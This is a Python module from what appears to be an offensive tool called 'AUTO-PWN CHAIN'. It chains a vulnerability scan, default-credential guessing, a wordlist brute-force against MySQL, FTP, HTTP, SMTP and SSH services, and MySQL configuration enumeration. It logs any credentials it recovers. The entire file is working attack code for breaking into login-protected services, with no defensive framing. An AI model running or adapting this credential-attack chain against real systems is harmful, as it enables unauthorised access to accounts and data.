"""
Automated chain: vuln scan → default creds → dictionary → enum.
Works for MySQL, FTP, HTTP, HTTPS, SMTP, SSH.
"""
from Design.colors_cli import console
from modules.target import TargetInfo
from modules.attack_config import AttackConfig, CredentialMode, load_wordlist
from modules.attacks.common import attempt, save_result, apply_delay
from modules.attacks import vuln_scan, config_enum


def _default_creds(target, config):
    console.print("\n[bold secondary]▸ Step 2: default credential check[/bold secondary]")
    for u in config.auto_default_users:
        for p in config.auto_default_passes:
            if attempt(target.host, target.port, u, p, target.service):
                console.print(f"  [success]✓ Default:[/success] [text]{u}:{p}[/text]")
                save_result(target.host, target.port, u, p,
                            config.log_file, target.service)
                return u, p
            apply_delay(config.delay)
    console.print("  [muted]No default match.[/muted]")
    return None


def _dictionary_fallback(target, config):
    console.print("\n[bold secondary]▸ Step 3: dictionary fallback[/bold secondary]")
    try:
        users = load_wordlist(config.username_file) if config.username_file else []
        passes = load_wordlist(config.password_file) if config.password_file else []
    except Exception as e:
        console.print(f"  [warning]wordlist error: {e}[/warning]")
        return None
    if not users or not passes:
        console.print("  [muted]No wordlists configured — skipping.[/muted]")
        return None
    limit = config.max_length or 300
    tried = 0
    for u in users:
        for p in passes:
            if attempt(target.host, target.port, u, p, target.service):
                console.print(f"  [success]✓ Match:[/success] [text]{u}:{p}[/text]")
                save_result(target.host, target.port, u, p,
                            config.log_file, target.service)
                return u, p
            tried += 1
            if tried >= limit:
                console.print(f"  [muted]Reached {limit} attempts.[/muted]")
                return None
            apply_delay(config.delay)
    return None


def run(target: TargetInfo, config: AttackConfig) -> None:
    console.print(
        f"\n[bold primary]━━━ AUTO-PWN CHAIN ━━━[/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.service.upper()} "
        f"{target.host}:{target.port}[/primary]\n"
    )

    console.print("\n[bold secondary]▸ Step 1: vulnerability scan[/bold secondary]")
    try:
        vuln_scan.run(target, config)
    except Exception as e:
        console.print(f"  [warning]vuln scan error: {e}[/warning]")

    creds = _default_creds(target, config)
    if not creds:
        creds = _dictionary_fallback(target, config)

    if creds and target.service == "mysql":
        console.print("\n[bold secondary]▸ Step 4: config enumeration[/bold secondary]")
        enum_cfg = AttackConfig(
            attack_type=config.attack_type,
            username_mode=CredentialMode.FIXED, username_value=creds[0],
            password_mode=CredentialMode.FIXED, password_value=creds[1],
            log_file=config.log_file,
        )
        try:
            config_enum.run(target, enum_cfg)
        except Exception as e:
            console.print(f"  [warning]enum error: {e}[/warning]")

    if creds:
        console.print(
            f"\n[bold success]✓ AUTO-PWN COMPLETE — {creds[0]}:{creds[1]}[/bold success]"
        )
    else:
        console.print("\n[warning]AUTO-PWN finished — no credentials recovered.[/warning]")